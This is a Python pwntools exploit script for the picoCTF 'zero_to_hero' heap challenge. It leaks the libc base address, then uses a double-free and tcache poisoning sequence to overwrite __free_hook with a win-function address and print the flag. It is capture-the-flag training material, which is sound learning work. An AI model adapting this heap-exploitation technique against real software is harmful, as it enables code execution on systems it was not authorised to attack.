import struct
from pwn import *

#####################################################change directory######################################################
level = "zero_to_hero"
ip = "jupiter.challenges.picoctf.org:29476"
dir = "/home/ayush/Work/picoCTF/BinaryExploitation/"+level

####################################################operation mode#######################################################
args.DEBUG = False
args.REMOTE = False
args.gdbscript = "break *0x400d5e\ndefine hook-stop\nx/24wx 0x602060\nend\n"
#####################################################setup solution################################################
context.arch = 'amd64'
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
binary = ELF(dir + "/zero_to_hero")
libc = ELF(dir + "/libc.so.6")
#######################################################start process##############################################
def conn():
    if args.REMOTE:
        return remote(ip.split(':')[0], ip.split(':')[1])
    elif args.DEBUG: 
        return gdb.debug(binary.path, gdbscript=args.gdbscript)
    else:
        return process([binary.path])
r = conn()
################################################Useful functions#########################################################
def get_power(size, flavor):
    r.sendlineafter(">", b"1")
    r.sendlineafter(">", size)
    r.sendafter(">", flavor)
def remove_power(index):
    r.sendlineafter(">", b"2")
    r.sendlineafter(">", index)
#################################################get free hook address###################################################
r.sendlineafter("?", b"y")
r.recvuntil("Take this: ")
win_addr = struct.pack("l", 0x400a02)
system_libc = int(r.recvline().strip(),0)
libc_addr = system_libc - libc.symbols['system']
free_hook_addr = libc_addr + libc.symbols["__free_hook"]
log.info("Leaked libc: {0}".format(hex(libc_addr)))
#################################################overwrite free_hook###################################################
get_power(b"256", b"A"*16)
r.sendline()
get_power(b"256", b"B"*16)
r.sendline()
remove_power(b"1")
remove_power(b"0")
get_power(b"264", b"C"*264)
remove_power(b"1")
get_power(b"256", struct.pack("l", free_hook_addr))
r.sendline()
get_power(b"240", b"E"*16)
r.sendline()
get_power(b"240", win_addr)
r.sendline()
remove_power(b"0")
##############################################get flag value#############################################################
flag = r.recvuntil("}")
log.info("flag: {0}".format(str(flag)[3:-1]))
r.close()